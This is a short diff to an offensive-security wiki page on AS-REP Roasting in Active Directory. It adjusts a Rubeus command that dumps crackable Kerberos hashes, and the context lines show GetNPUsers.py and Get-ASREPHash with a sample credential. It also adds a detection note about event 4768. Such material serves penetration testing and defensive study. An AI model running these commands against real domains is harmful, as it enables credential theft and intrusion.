@@ -50,10 +50,14 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 
 {% code title="Using Windows" %}
 ```bash
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 {% endcode %}
+
+{% hint style="warning" %}
+AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+{% endhint %}
 
 ### Cracking
 
